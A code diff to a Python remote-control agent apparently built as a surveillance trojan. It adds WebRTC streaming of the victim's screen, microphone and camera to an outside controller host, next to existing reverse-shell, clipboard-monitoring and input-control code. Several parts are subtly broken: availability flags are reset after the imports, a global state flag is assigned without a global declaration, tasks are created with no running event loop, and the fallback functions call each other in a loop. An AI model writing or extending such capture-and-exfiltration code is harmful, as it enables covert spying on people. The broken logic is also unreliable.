@@ -219,8 +219,10 @@ except ImportError:
 try:
     import pyaudio
     PYAUDIO_AVAILABLE = True
+    FORMAT = pyaudio.paInt16  # Set FORMAT only if pyaudio is available
 except ImportError:
     PYAUDIO_AVAILABLE = False
+    FORMAT = None
     log_message("PyAudio not available, audio features may not work", "warning")
 
 # Input handling imports
@@ -287,6 +289,34 @@ try:
 except ImportError:
     SOCKETIO_AVAILABLE = False
     log_message("python-socketio not available, real-time communication may not work", "warning")
+
+# WebRTC imports for low-latency streaming
+try:
+    import aiortc
+    from aiortc import RTCPeerConnection, MediaStreamTrack, RTCSessionDescription
+    from aiortc.contrib.media import MediaRecorder, MediaPlayer, MediaRelay
+    from aiortc.mediastreams import MediaStreamError
+    import av
+    AIORTC_AVAILABLE = True
+    log_message("aiortc WebRTC library available - enabling low-latency streaming", "info")
+except ImportError:
+    AIORTC_AVAILABLE = False
+    log_message("aiortc not available, WebRTC streaming disabled - using fallback Socket.IO", "warning")
+
+# Additional WebRTC dependencies
+try:
+    import aiohttp
+    AIOHTTP_AVAILABLE = True
+except ImportError:
+    AIOHTTP_AVAILABLE = False
+    log_message("aiohttp not available, some WebRTC features may not work", "warning")
+
+try:
+    import aiortc.contrib.signaling
+    AIORTC_SIGNALING_AVAILABLE = True
+except ImportError:
+    AIORTC_SIGNALING_AVAILABLE = False
+    log_message("aiortc.contrib.signaling not available, using custom signaling", "warning")
 
 SERVER_URL = "https://agent-controller.onrender.com"  # Change to your controller's URL
 
@@ -362,9 +392,51 @@ low_latency_available = False
 
 # Clipboard and monitoring
 CHUNK = 1024
-FORMAT = pyaudio.paInt16
+FORMAT = None  # Will be set conditionally based on pyaudio availability
 CHANNELS = 1
 RATE = 44100
+
+# WebRTC streaming variables
+WEBRTC_ENABLED = False
+WEBRTC_PEER_CONNECTIONS = {}  # agent_id -> RTCPeerConnection
+WEBRTC_STREAMS = {}  # agent_id -> MediaStreamTrack
+WEBRTC_SIGNALING_QUEUE = queue.Queue()
+WEBRTC_ICE_SERVERS = [
+    {"urls": ["stun:stun.l.google.com:19302"]},
+    {"urls": ["stun:stun1.l.google.com:19302"]}
+]
+WEBRTC_CONFIG = {
+    "iceServers": WEBRTC_ICE_SERVERS,
+    "iceCandidatePoolSize": 10
+}
+
+# Module availability flags
+CV2_AVAILABLE = False
+NUMPY_AVAILABLE = False
+PIL_AVAILABLE = False
+PYAUDIO_AVAILABLE = False
+PYNPUT_AVAILABLE = False
+PYAUTOGUI_AVAILABLE = False
+PYGAME_AVAILABLE = False
+PSUTIL_AVAILABLE = False
+SPEECH_RECOGNITION_AVAILABLE = False
+WEBSOCKETS_AVAILABLE = False
+SOCKETIO_AVAILABLE = False
+FLASK_AVAILABLE = False
+FLASK_SOCKETIO_AVAILABLE = False
+
+# WebRTC module availability flags
+AIORTC_AVAILABLE = False
+AIOHTTP_AVAILABLE = False
+AIORTC_SIGNALING_AVAILABLE = False
+REQUESTS_AVAILABLE = False
+MSS_AVAILABLE = False
+HAS_DXCAM = False
+HAS_TURBOJPEG = False
+HAS_LZ4 = False
+HAS_MSGPACK = False
+HAS_XXHASH = False
+WINDOWS_AVAILABLE = False
 
 def check_system_requirements():
     """
@@ -3825,10 +3897,11 @@ def start_streaming(agent_id):
     global STREAMING_ENABLED, STREAM_THREAD
     if not STREAMING_ENABLED:
         STREAMING_ENABLED = True
-        STREAM_THREAD = threading.Thread(target=stream_screen_h264_socketio, args=(agent_id,))
+        # Use smart streaming that automatically chooses WebRTC or Socket.IO
+        STREAM_THREAD = threading.Thread(target=stream_screen_webrtc_or_socketio, args=(agent_id,))
         STREAM_THREAD.daemon = True
         STREAM_THREAD.start()
-        log_message("Started H.264 video stream.")
+        log_message("Started smart video streaming (WebRTC preferred, Socket.IO fallback).")
 
 def stop_streaming():
     global STREAMING_ENABLED, STREAM_THREAD
@@ -3840,7 +3913,7 @@ def stop_streaming():
         log_message("Stopped video stream.")
 
 def start_audio_streaming(agent_id):
-    """Start modern Opus audio streaming with multi-threaded pipeline."""
+    """Start smart audio streaming that automatically chooses WebRTC or Socket.IO."""
     global AUDIO_STREAMING_ENABLED, AUDIO_STREAM_THREADS, audio_capture_queue, audio_encode_queue
     import queue
     import threading
@@ -3848,7 +3921,17 @@ def start_audio_streaming(agent_id):
     if not AUDIO_STREAMING_ENABLED:
         AUDIO_STREAMING_ENABLED = True
         
-        # Initialize queues
+        # Try WebRTC first for low latency
+        if AIORTC_AVAILABLE and WEBRTC_ENABLED:
+            try:
+                # Use WebRTC audio streaming
+                asyncio.create_task(start_webrtc_audio_streaming(agent_id))
+                log_message("Started WebRTC audio streaming (sub-second latency)")
+                return
+            except Exception as e:
+                log_message(f"WebRTC audio streaming failed, falling back to Socket.IO: {e}", "warning")
+        
+        # Fallback to Socket.IO multi-threaded pipeline
         audio_capture_queue = queue.Queue(maxsize=AUDIO_CAPTURE_QUEUE_SIZE)
         audio_encode_queue = queue.Queue(maxsize=AUDIO_ENCODE_QUEUE_SIZE)
         
@@ -3863,7 +3946,7 @@ def start_audio_streaming(agent_id):
             thread.start()
         
         AUDIO_STREAM_THREADS = threads
-        log_message("Started Opus audio streaming pipeline.")
+        log_message("Started Socket.IO Opus audio streaming pipeline (fallback mode).")
 
 def stop_audio_streaming():
     """Stop modern Opus audio streaming pipeline."""
@@ -3882,12 +3965,25 @@ def stop_audio_streaming():
         log_message("Stopped Opus audio streaming pipeline.")
 
 def start_camera_streaming(agent_id):
-    """Start modern H.264 camera streaming with multi-threaded pipeline."""
+    """Start smart camera streaming that automatically chooses WebRTC or Socket.IO."""
     global CAMERA_STREAMING_ENABLED, CAMERA_STREAM_THREADS
     
     if not CAMERA_STREAMING_ENABLED:
+        CAMERA_STREAMING_ENABLED = True
+        
+        # Try WebRTC first for low latency
+        if AIORTC_AVAILABLE and WEBRTC_ENABLED:
+            try:
+                # Use WebRTC camera streaming
+                asyncio.create_task(start_webrtc_camera_streaming(agent_id))
+                log_message("Started WebRTC camera streaming (sub-second latency)")
+                return
+            except Exception as e:
+                log_message(f"WebRTC camera streaming failed, falling back to Socket.IO: {e}", "warning")
+        
+        # Fallback to Socket.IO
         stream_camera_h264_socketio(agent_id)
-        log_message("Started camera stream.")
+        log_message("Started Socket.IO camera stream (fallback mode).")
 
 def stop_camera_streaming():
     """Stop modern H.264 camera streaming pipeline."""
@@ -3904,6 +4000,536 @@ def stop_camera_streaming():
         camera_capture_queue = None
         camera_encode_queue = None
         log_message("Stopped camera stream.")
+
+# ========================================================================================
+# WEBRTC PEER CONNECTION MANAGEMENT FOR LOW-LATENCY STREAMING
+# ========================================================================================
+
+async def create_webrtc_peer_connection(agent_id, enable_screen=True, enable_audio=True, enable_camera=False):
+    """Create and configure WebRTC peer connection with media tracks."""
+    if not AIORTC_AVAILABLE:
+        log_message("WebRTC not available, falling back to Socket.IO streaming", "warning")
+        return None
+    
+    try:
+        # Create peer connection with optimized configuration
+        pc = RTCPeerConnection(configuration=WEBRTC_CONFIG)
+        
+        # Add media tracks
+        if enable_screen:
+            screen_track = ScreenTrack(agent_id, target_fps=30, quality=85)
+            pc.addTrack(screen_track)
+            WEBRTC_STREAMS[f"{agent_id}_screen"] = screen_track
+            log_message(f"Added screen track to WebRTC connection for agent {agent_id}")
+        
+        if enable_audio:
+            audio_track = AudioTrack(agent_id, sample_rate=44100, channels=1)
+            pc.addTrack(audio_track)
+            WEBRTC_STREAMS[f"{agent_id}_audio"] = audio_track
+            log_message(f"Added audio track to WebRTC connection for agent {agent_id}")
+        
+        if enable_camera:
+            camera_track = CameraTrack(agent_id, camera_index=0, target_fps=30, quality=85)
+            pc.addTrack(camera_track)
+            WEBRTC_STREAMS[f"{agent_id}_camera"] = camera_track
+            log_message(f"Added camera track to WebRTC connection for agent {agent_id}")
+        
+        # Store peer connection
+        WEBRTC_PEER_CONNECTIONS[agent_id] = pc
+        
+        # Set up connection state change handlers
+        @pc.on("connectionstatechange")
+        async def on_connectionstatechange():
+            log_message(f"WebRTC connection state changed to {pc.connectionState} for agent {agent_id}")
+            if pc.connectionState == "failed":
+                await close_webrtc_connection(agent_id)
+        
+        @pc.on("iceconnectionstatechange")
+        async def on_iceconnectionstatechange():
+            log_message(f"ICE connection state: {pc.iceConnectionState} for agent {agent_id}")
+        
+        @pc.on("icegatheringstatechange")
+        async def on_icegatheringstatechange():
+            log_message(f"ICE gathering state: {pc.iceGatheringState} for agent {agent_id}")
+        
+        log_message(f"WebRTC peer connection created successfully for agent {agent_id}")
+        return pc
+        
+    except Exception as e:
+        log_message(f"Failed to create WebRTC peer connection: {e}", "error")
+        return None
+
+
+async def create_webrtc_offer(agent_id):
+    """Create WebRTC offer for the specified agent."""
+    pc = WEBRTC_PEER_CONNECTIONS.get(agent_id)
+    if not pc:
+        log_message(f"No WebRTC peer connection found for agent {agent_id}", "error")
+        return None
+    
+    try:
+        # Create offer with optimized settings for low latency
+        offer = await pc.createOffer()
+        
+        # Set codec preferences for low latency
+        if hasattr(offer, 'sdp'):
+            # Prefer VP8/VP9 for lower latency, H.264 as fallback
+            sdp = offer.sdp
+            # Add codec preferences
+            sdp = sdp.replace("useinbandfec=1", "useinbandfec=1; stereo=1; maxaveragebitrate=128000")
+            
+            # Set low latency options
+            sdp = sdp.replace("a=mid:0", "a=mid:0\na=content:main")
+            sdp = sdp.replace("a=mid:1", "a=mid:1\na=content:main")
+            
+            # Update offer with modified SDP
+            offer.sdp = sdp
+        
+        await pc.setLocalDescription(offer)
+        log_message(f"WebRTC offer created for agent {agent_id}")
+        return offer
+        
+    except Exception as e:
+        log_message(f"Failed to create WebRTC offer: {e}", "error")
+        return None
+
+
+async def handle_webrtc_answer(agent_id, answer_sdp):
+    """Handle WebRTC answer from controller."""
+    pc = WEBRTC_PEER_CONNECTIONS.get(agent_id)
+    if not pc:
+        log_message(f"No WebRTC peer connection found for agent {agent_id}", "error")
+        return False
+    
+    try:
+        # Create RTCSessionDescription from SDP
+        answer = RTCSessionDescription(sdp=answer_sdp, type="answer")
+        
+        # Set remote description
+        await pc.setRemoteDescription(answer)
+        log_message(f"WebRTC answer set for agent {agent_id}")
+        return True
+        
+    except Exception as e:
+        log_message(f"Failed to handle WebRTC answer: {e}", "error")
+        return False
+
+
+async def handle_webrtc_ice_candidate(agent_id, candidate_data):
+    """Handle ICE candidate from controller."""
+    pc = WEBRTC_PEER_CONNECTIONS.get(agent_id)
+    if not pc:
+        log_message(f"No WebRTC peer connection found for agent {agent_id}", "error")
+        return False
+    
+    try:
+        # Add ICE candidate
+        await pc.addIceCandidate(candidate_data)
+        log_message(f"ICE candidate added for agent {agent_id}")
+        return True
+        
+    except Exception as e:
+        log_message(f"Failed to add ICE candidate: {e}", "error")
+        return False
+
+
+async def close_webrtc_connection(agent_id):
+    """Close WebRTC connection for the specified agent."""
+    pc = WEBRTC_PEER_CONNECTIONS.get(agent_id)
+    if pc:
+        try:
+            await pc.close()
+            del WEBRTC_PEER_CONNECTIONS[agent_id]
+            
+            # Clean up media tracks
+            for key in list(WEBRTC_STREAMS.keys()):
+                if key.startswith(f"{agent_id}_"):
+                    del WEBRTC_STREAMS[key]
+            
+            log_message(f"WebRTC connection closed for agent {agent_id}")
+            return True
+            
+        except Exception as e:
+            log_message(f"Error closing WebRTC connection: {e}", "error")
+            return False
+    
+    return True
+
+
+def start_webrtc_streaming(agent_id, enable_screen=True, enable_audio=True, enable_camera=False):
+    """Start WebRTC streaming for the specified agent."""
+    if not AIORTC_AVAILABLE:
+        log_message("WebRTC not available, using fallback Socket.IO streaming", "warning")
+        # Fallback to existing Socket.IO streaming
+        if enable_screen:
+            stream_screen_h264_socketio(agent_id)
+        if enable_audio:
+            start_audio_streaming(agent_id)
+        if enable_camera:
+            start_camera_streaming(agent_id)
+        return False
+    
+    try:
+        # Create WebRTC peer connection
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        
+        async def setup_webrtc():
+            pc = await create_webrtc_peer_connection(agent_id, enable_screen, enable_audio, enable_camera)
+            if pc:
+                offer = await create_webrtc_offer(agent_id)
+                if offer:
+                    # Send offer to controller via Socket.IO
+                    if SOCKETIO_AVAILABLE:
+                        sio.emit('webrtc_offer', {
+                            'agent_id': agent_id,
+                            'offer_sdp': offer.sdp,
+                            'enable_screen': enable_screen,
+                            'enable_audio': enable_audio,
+                            'enable_camera': enable_camera
+                        })
+                        log_message(f"WebRTC offer sent to controller for agent {agent_id}")
+                        return True
+        
+        # Run WebRTC setup
+        result = loop.run_until_complete(setup_webrtc())
+        loop.close()
+        
+        if result:
+            WEBRTC_ENABLED = True
+            log_message(f"WebRTC streaming started for agent {agent_id}")
+            return True
+        else:
+            log_message(f"Failed to start WebRTC streaming for agent {agent_id}", "error")
+            return False
+            
+    except Exception as e:
+        log_message(f"Error starting WebRTC streaming: {e}", "error")
+        return False
+
+
+def stop_webrtc_streaming(agent_id):
+    """Stop WebRTC streaming for the specified agent."""
+    if not AIORTC_AVAILABLE:
+        log_message("WebRTC not available", "warning")
+        return False
+    
+    try:
+        # Close WebRTC connection
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        
+        async def cleanup_webrtc():
+            return await close_webrtc_connection(agent_id)
+        
+        result = loop.run_until_complete(cleanup_webrtc())
+        loop.close()
+        
+        if result:
+            WEBRTC_ENABLED = False
+            log_message(f"WebRTC streaming stopped for agent {agent_id}")
+            return True
+        else:
+            log_message(f"Failed to stop WebRTC streaming for agent {agent_id}", "error")
+            return False
+            
+    except Exception as e:
+        log_message(f"Error stopping WebRTC streaming: {e}", "error")
+        return False
+
+
+def get_webrtc_stats(agent_id):
+    """Get WebRTC streaming statistics for the specified agent."""
+    stats = {
+        'webrtc_enabled': WEBRTC_ENABLED,
+        'peer_connection_state': 'disconnected',
+        'ice_connection_state': 'disconnected',
+        'media_tracks': {}
+    }
+    
+    pc = WEBRTC_PEER_CONNECTIONS.get(agent_id)
+    if pc:
+        stats['peer_connection_state'] = pc.connectionState
+        stats['ice_connection_state'] = pc.iceConnectionState
+        
+        # Get media track stats
+        for key, track in WEBRTC_STREAMS.items():
+            if key.startswith(f"{agent_id}_"):
+                track_type = key.split('_')[1]
+                stats['media_tracks'][track_type] = track.get_stats()
+    
+    return stats
+
+
+# ========================================================================================
+# WEBRTC STREAMING INTEGRATION - REPLACING SOCKET.IO FRAME PIPELINE
+# ========================================================================================
+
+def start_webrtc_screen_streaming(agent_id):
+    """Start WebRTC screen streaming using MediaStreamTrack instead of Socket.IO."""
+    global WEBRTC_STREAMS, WEBRTC_ENABLED
+    
+    if not AIORTC_AVAILABLE or not WEBRTC_ENABLED:
+        log_message("WebRTC not available, falling back to Socket.IO streaming", "warning")
+        return stream_screen_h264_socketio(agent_id)
+    
+    try:
+        # Create WebRTC peer connection with screen track
+        asyncio.create_task(create_webrtc_peer_connection(
+            agent_id, enable_screen=True, enable_audio=False, enable_camera=False
+        ))
+        
+        # Store stream info
+        WEBRTC_STREAMS[agent_id] = {
+            'type': 'screen',
+            'started_at': time.time(),
+            'status': 'starting'
+        }
+        
+        log_message(f"Started WebRTC screen streaming for agent {agent_id}")
+        return True
+        
+    except Exception as e:
+        log_message(f"Failed to start WebRTC screen streaming: {e}", "error")
+        # Fallback to Socket.IO
+        return stream_screen_h264_socketio(agent_id)
+
+def start_webrtc_audio_streaming(agent_id):
+    """Start WebRTC audio streaming using MediaStreamTrack instead of Socket.IO."""
+    global WEBRTC_STREAMS, WEBRTC_ENABLED
+    
+    if not AIORTC_AVAILABLE or not WEBRTC_ENABLED:
+        log_message("WebRTC not available, falling back to Socket.IO streaming", "warning")
+        return start_audio_streaming(agent_id)
+    
+    try:
+        # Create WebRTC peer connection with audio track
+        asyncio.create_task(create_webrtc_peer_connection(
+            agent_id, enable_screen=False, enable_audio=True, enable_camera=False
+        ))
+        
+        # Store stream info
+        WEBRTC_STREAMS[agent_id] = {
+            'type': 'audio',
+            'started_at': time.time(),
+            'status': 'starting'
+        }
+        
+        log_message(f"Started WebRTC audio streaming for agent {agent_id}")
+        return True
+        
+    except Exception as e:
+        log_message(f"Failed to start WebRTC audio streaming: {e}", "error")
+        # Fallback to Socket.IO
+        return start_audio_streaming(agent_id)
+
+def start_webrtc_camera_streaming(agent_id):
+    """Start WebRTC camera streaming using MediaStreamTrack instead of Socket.IO."""
+    global WEBRTC_STREAMS, WEBRTC_ENABLED
+    
+    if not AIORTC_AVAILABLE or not WEBRTC_ENABLED:
+        log_message("WebRTC not available, falling back to Socket.IO streaming", "warning")
+        return start_camera_streaming(agent_id)
+    
+    try:
+        # Create WebRTC peer connection with camera track
+        asyncio.create_task(create_webrtc_peer_connection(
+            agent_id, enable_screen=False, enable_audio=False, enable_camera=True
+        ))
+        
+        # Store stream info
+        WEBRTC_STREAMS[agent_id] = {
+            'type': 'camera',
+            'started_at': time.time(),
+            'status': 'starting'
+        }
+        
+        log_message(f"Started WebRTC camera streaming for agent {agent_id}")
+        return True
+        
+    except Exception as e:
+        log_message(f"Failed to start WebRTC camera streaming: {e}", "error")
+        # Fallback to Socket.IO
+        return start_camera_streaming(agent_id)
+
+def start_webrtc_full_streaming(agent_id):
+    """Start WebRTC full streaming (screen + audio + camera) using MediaStreamTrack."""
+    global WEBRTC_STREAMS, WEBRTC_ENABLED
+    
+    if not AIORTC_AVAILABLE or not WEBRTC_ENABLED:
+        log_message("WebRTC not available, falling back to Socket.IO streaming", "warning")
+        start_streaming(agent_id)
+        start_audio_streaming(agent_id)
+        start_camera_streaming(agent_id)
+        return False
+    
+    try:
+        # Create WebRTC peer connection with all tracks
+        asyncio.create_task(create_webrtc_peer_connection(
+            agent_id, enable_screen=True, enable_audio=True, enable_camera=True
+        ))
+        
+        # Store stream info
+        WEBRTC_STREAMS[agent_id] = {
+            'type': 'full',
+            'started_at': time.time(),
+            'status': 'starting'
+        }
+        
+        log_message(f"Started WebRTC full streaming for agent {agent_id}")
+        return True
+        
+    except Exception as e:
+        log_message(f"Failed to start WebRTC full streaming: {e}", "error")
+        # Fallback to Socket.IO
+        start_streaming(agent_id)
+        start_audio_streaming(agent_id)
+        start_camera_streaming(agent_id)
+        return False
+
+def stop_webrtc_streaming_by_type(agent_id, stream_type=None):
+    """Stop WebRTC streaming for specific type or all types."""
+    global WEBRTC_STREAMS, WEBRTC_PEER_CONNECTIONS
+    
+    if agent_id not in WEBRTC_STREAMS:
+        return False
+    
+    try:
+        if stream_type is None or WEBRTC_STREAMS[agent_id]['type'] == stream_type:
+            # Close WebRTC connection
+            asyncio.create_task(close_webrtc_connection(agent_id))
+            
+            # Remove from tracking
+            if agent_id in WEBRTC_STREAMS:
+                del WEBRTC_STREAMS[agent_id]
+            
+            log_message(f"Stopped WebRTC {stream_type or 'all'} streaming for agent {agent_id}")
+            return True
+            
+    except Exception as e:
+        log_message(f"Failed to stop WebRTC streaming: {e}", "error")
+    
+    return False
+
+def get_webrtc_streaming_status(agent_id):
+    """Get current WebRTC streaming status for an agent."""
+    global WEBRTC_STREAMS, WEBRTC_PEER_CONNECTIONS
+    
+    if agent_id not in WEBRTC_STREAMS:
+        return {'status': 'not_streaming'}
+    
+    stream_info = WEBRTC_STREAMS[agent_id].copy()
+    
+    # Add peer connection status
+    if agent_id in WEBRTC_PEER_CONNECTIONS:
+        pc = WEBRTC_PEER_CONNECTIONS[agent_id]
+        stream_info['connection_state'] = pc.connectionState
+        stream_info['ice_connection_state'] = pc.iceConnectionState
+        stream_info['ice_gathering_state'] = pc.iceGatheringState
+    
+    return stream_info
+
+def switch_to_webrtc_streaming(agent_id, stream_type='screen'):
+    """Switch from Socket.IO to WebRTC streaming for the specified type."""
+    global STREAMING_ENABLED, AUDIO_STREAMING_ENABLED, CAMERA_STREAMING_ENABLED
+    
+    if not AIORTC_AVAILABLE or not WEBRTC_ENABLED:
+        log_message("WebRTC not available, cannot switch streaming method", "warning")
+        return False
+    
+    try:
+        # Stop current Socket.IO streaming
+        if stream_type == 'screen' and STREAMING_ENABLED:
+            stop_streaming()
+        elif stream_type == 'audio' and AUDIO_STREAMING_ENABLED:
+            stop_audio_streaming()
+        elif stream_type == 'camera' and CAMERA_STREAMING_ENABLED:
+            stop_camera_streaming()
+        
+        # Start WebRTC streaming
+        if stream_type == 'screen':
+            return start_webrtc_screen_streaming(agent_id)
+        elif stream_type == 'audio':
+            return start_webrtc_audio_streaming(agent_id)
+        elif stream_type == 'camera':
+            return start_webrtc_camera_streaming(agent_id)
+        elif stream_type == 'full':
+            return start_webrtc_full_streaming(agent_id)
+        
+    except Exception as e:
+        log_message(f"Failed to switch to WebRTC streaming: {e}", "error")
+        return False
+    
+    return False
+
+def switch_to_socketio_streaming(agent_id, stream_type='screen'):
+    """Switch from WebRTC to Socket.IO streaming for the specified type."""
+    try:
+        # Stop WebRTC streaming
+        stop_webrtc_streaming_by_type(agent_id, stream_type)
+        
+        # Start Socket.IO streaming
+        if stream_type == 'screen':
+            return stream_screen_h264_socketio(agent_id)
+        elif stream_type == 'audio':
+            return start_audio_streaming(agent_id)
+        elif stream_type == 'camera':
+            return start_camera_streaming(agent_id)
+        elif stream_type == 'full':
+            stream_screen_h264_socketio(agent_id)
+            start_audio_streaming(agent_id)
+            start_camera_streaming(agent_id)
+            return True
+        
+    except Exception as e:
+        log_message(f"Failed to switch to Socket.IO streaming: {e}", "error")
+        return False
+    
+    return False
+
+# ========================================================================================
+# ENHANCED STREAMING FUNCTIONS WITH WEBRTC INTEGRATION
+# ========================================================================================
+
+def stream_screen_webrtc_or_socketio(agent_id):
+    """Smart screen streaming that automatically chooses WebRTC or Socket.IO based on availability."""
+    if AIORTC_AVAILABLE and WEBRTC_ENABLED:
+        log_message("Using WebRTC for screen streaming (sub-second latency)")
+        return start_webrtc_screen_streaming(agent_id)
+    else:
+        log_message("Using Socket.IO for screen streaming (fallback mode)")
+        return stream_screen_h264_socketio(agent_id)
+
+def stream_audio_webrtc_or_socketio(agent_id):
+    """Smart audio streaming that automatically chooses WebRTC or Socket.IO based on availability."""
+    if AIORTC_AVAILABLE and WEBRTC_ENABLED:
+        log_message("Using WebRTC for audio streaming (low latency)")
+        return start_webrtc_audio_streaming(agent_id)
+    else:
+        log_message("Using Socket.IO for audio streaming (fallback mode)")
+        return start_audio_streaming(agent_id)
+
+def stream_camera_webrtc_or_socketio(agent_id):
+    """Smart camera streaming that automatically chooses WebRTC or Socket.IO based on availability."""
+    if AIORTC_AVAILABLE and WEBRTC_ENABLED:
+        log_message("Using WebRTC for camera streaming (low latency)")
+        return start_webrtc_camera_streaming(agent_id)
+    else:
+        log_message("Using Socket.IO for camera streaming (fallback mode)")
+        return start_camera_streaming(agent_id)
+
+def stream_full_webrtc_or_socketio(agent_id):
+    """Smart full streaming that automatically chooses WebRTC or Socket.IO based on availability."""
+    if AIORTC_AVAILABLE and WEBRTC_ENABLED:
+        log_message("Using WebRTC for full streaming (sub-second latency)")
+        return start_webrtc_full_streaming(agent_id)
+    else:
+        log_message("Using Socket.IO for full streaming (fallback mode)")
+        start_streaming(agent_id)
+        start_audio_streaming(agent_id)
+        start_camera_streaming(agent_id)
+        return False
+
 
 # --- Reverse Shell Functions ---
 
@@ -5826,6 +6452,353 @@ class LowLatencyInputHandler:
         """Get performance statistics."""
         return self.stats.copy()
 
+# ========================================================================================
+# WEBRTC MEDIA STREAM TRACKS FOR LOW-LATENCY STREAMING
+# ========================================================================================
+
+class ScreenTrack(MediaStreamTrack):
+    """WebRTC MediaStreamTrack for screen capture with sub-second latency."""
+    
+    kind = "video"
+    
+    def __init__(self, agent_id, target_fps=30, quality=85):
+        super().__init__()
+        self.agent_id = agent_id
+        self.target_fps = target_fps
+        self.quality = quality
+        self.frame_interval = 1.0 / target_fps
+        self.last_frame_time = 0
+        self.capture = None
+        self.stats = {
+            'frames_sent': 0,
+            'total_bytes': 0,
+            'avg_latency': 0.0,
+            'fps': 0.0
+        }
+        
+        # Initialize capture backend
+        if AIORTC_AVAILABLE:
+            try:
+                if MSS_AVAILABLE:
+                    import mss
+                    self.capture = mss.mss()
+                elif CV2_AVAILABLE:
+                    self.capture = cv2.VideoCapture(0)  # Fallback to camera if screen capture fails
+                log_message(f"ScreenTrack initialized for agent {agent_id} at {target_fps} FPS")
+            except Exception as e:
+                log_message(f"Failed to initialize ScreenTrack: {e}", "error")
+    
+    async def recv(self):
+        """Generate and return video frames for WebRTC streaming."""
+        if not AIORTC_AVAILABLE or not self.capture:
+            # Fallback to placeholder frame
+            frame = av.VideoFrame.from_ndarray(
+                np.zeros((480, 640, 3), dtype=np.uint8),
+                format="bgr24"
+            )
+            frame.pts, frame.time_base = await self.next_timestamp()
+            return frame
+        
+        try:
+            current_time = time.time()
+            
+            # Control frame rate
+            if current_time - self.last_frame_time < self.frame_interval:
+                await asyncio.sleep(0.001)  # Brief pause
+                return await self.recv()
+            
+            # Capture screen frame
+            if MSS_AVAILABLE and hasattr(self.capture, 'grab'):
+                # Use mss for screen capture
+                monitor = self.capture.monitors[1]  # Primary monitor
+                screenshot = self.capture.grab(monitor)
+                img_array = np.array(screenshot)
+                
+                # Convert BGRA to BGR
+                if img_array.shape[2] == 4:
+                    img_array = img_array[:, :, :3]
+                
+            elif CV2_AVAILABLE and hasattr(self.capture, 'read'):
+                # Fallback to OpenCV
+                ret, frame = self.capture.read()
+                if not ret:
+                    # Generate placeholder frame
+                    img_array = np.zeros((480, 640, 3), dtype=np.uint8)
+                else:
+                    img_array = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
+            else:
+                # Generate placeholder frame
+                img_array = np.zeros((480, 640, 3), dtype=np.uint8)
+            
+            # Create VideoFrame for aiortc
+            frame = av.VideoFrame.from_ndarray(img_array, format="bgr24")
+            frame.pts, frame.time_base = await self.next_timestamp()
+            
+            # Update stats
+            self.stats['frames_sent'] += 1
+            self.stats['fps'] = 1.0 / (current_time - self.last_frame_time) if self.last_frame_time > 0 else 0
+            self.last_frame_time = current_time
+            
+            return frame
+            
+        except Exception as e:
+            log_message(f"Error in ScreenTrack.recv: {e}", "error")
+            # Return placeholder frame on error
+            frame = av.VideoFrame.from_ndarray(
+                np.zeros((480, 640, 3), dtype=np.uint8),
+                format="bgr24"
+            )
+            frame.pts, frame.time_base = await self.next_timestamp()
+            return frame
+    
+    def get_stats(self):
+        """Get streaming statistics."""
+        return self.stats.copy()
+    
+    def set_quality(self, quality):
+        """Set video quality (1-100)."""
+        self.quality = max(1, min(100, quality))
+    
+    def set_fps(self, fps):
+        """Set target frame rate."""
+        self.target_fps = max(1, min(60, fps))
+        self.frame_interval = 1.0 / self.target_fps
+
+
+class AudioTrack(MediaStreamTrack):
+    """WebRTC MediaStreamTrack for audio capture with low latency."""
+    
+    kind = "audio"
+    
+    def __init__(self, agent_id, sample_rate=44100, channels=1):
+        super().__init__()
+        self.agent_id = agent_id
+        self.sample_rate = sample_rate
+        self.channels = channels
+        self.frame_size = 960  # 20ms at 48kHz
+        self.audio_queue = queue.Queue(maxsize=100)
+        self.stats = {
+            'audio_frames_sent': 0,
+            'total_samples': 0,
+            'sample_rate': sample_rate
+        }
+        
+        # Initialize audio capture
+        if AIORTC_AVAILABLE and PYAUDIO_AVAILABLE:
+            try:
+                self.audio = pyaudio.PyAudio()
+                self.stream = self.audio.open(
+                    format=pyaudio.paFloat32,
+                    channels=channels,
+                    rate=sample_rate,
+                    input=True,
+                    frames_per_buffer=self.frame_size,
+                    stream_callback=self._audio_callback
+                )
+                self.stream.start_stream()
+                log_message(f"AudioTrack initialized for agent {agent_id}")
+            except Exception as e:
+                log_message(f"Failed to initialize AudioTrack: {e}", "error")
+                self.audio = None
+                self.stream = None
+    
+    def _audio_callback(self, in_data, frame_count, time_info, status):
+        """Audio capture callback for PyAudio."""
+        try:
+            if not self.audio_queue.full():
+                self.audio_queue.put(in_data)
+        except Exception as e:
+            log_message(f"Audio callback error: {e}", "error")
+        return (None, pyaudio.paContinue)
+    
+    async def recv(self):
+        """Generate and return audio frames for WebRTC streaming."""
+        if not AIORTC_AVAILABLE:
+            # Fallback to silence
+            frame = av.AudioFrame.from_ndarray(
+                np.zeros((self.frame_size, self.channels), dtype=np.float32),
+                format="flt",
+                layout="stereo" if self.channels == 2 else "mono"
+            )
+            frame.pts, frame.time_base = await self.next_timestamp()
+            frame.sample_rate = self.sample_rate
+            return frame
+        
+        try:
+            # Get audio data from queue
+            try:
+                audio_data = self.audio_queue.get_nowait()
+            except queue.Empty:
+                # Generate silence if no audio data
+                audio_data = np.zeros(self.frame_size * self.channels, dtype=np.float32)
+            
+            # Convert to numpy array
+            if isinstance(audio_data, bytes):
+                audio_array = np.frombuffer(audio_data, dtype=np.float32)
+            else:
+                audio_array = np.array(audio_data, dtype=np.float32)
+            
+            # Reshape for channels
+            if self.channels == 2:
+                audio_array = audio_array.reshape(-1, 2)
+            else:
+                audio_array = audio_array.reshape(-1, 1)
+            
+            # Create AudioFrame for aiortc
+            frame = av.AudioFrame.from_ndarray(
+                audio_array,
+                format="flt",
+                layout="stereo" if self.channels == 2 else "mono"
+            )
+            frame.pts, frame.time_base = await self.next_timestamp()
+            frame.sample_rate = self.sample_rate
+            
+            # Update stats
+            self.stats['audio_frames_sent'] += 1
+            self.stats['total_samples'] += len(audio_array)
+            
+            return frame
+            
+        except Exception as e:
+            log_message(f"Error in AudioTrack.recv: {e}", "error")
+            # Return silence on error
+            frame = av.AudioFrame.from_ndarray(
+                np.zeros((self.frame_size, self.channels), dtype=np.float32),
+                format="flt",
+                layout="stereo" if self.channels == 2 else "mono"
+            )
+            frame.pts, frame.time_base = await self.next_timestamp()
+            frame.sample_rate = self.sample_rate
+            return frame
+    
+    def get_stats(self):
+        """Get audio streaming statistics."""
+        return self.stats.copy()
+    
+    def __del__(self):
